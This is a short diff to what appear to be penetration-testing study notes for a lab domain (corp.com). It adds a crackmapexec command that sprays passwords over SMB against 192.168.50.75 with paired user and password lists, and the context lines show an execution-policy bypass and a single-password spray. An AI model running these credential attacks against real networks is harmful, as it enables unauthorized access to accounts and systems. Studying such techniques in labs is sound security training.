@@ -268,6 +268,11 @@ powershell -ep bypass
 ```
 crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
 ```
+- Crackmapexec no brute force it is like 1. user - 1. pass; 2. user - 2. pass. Not 1. user - 1. pass and then 1. user - 2. pass
+```
+crackmapexec smb 192.168.50.75 -u users.txt -p pws.txt -d corp.com --continue-on-success --no-bruteforce
+```
+
 crackmapexec added `Pwn3d!` to the output, indicating that the user has administrative privileges on the target system
 
 **`crackmapexec` using NTLM Hash**
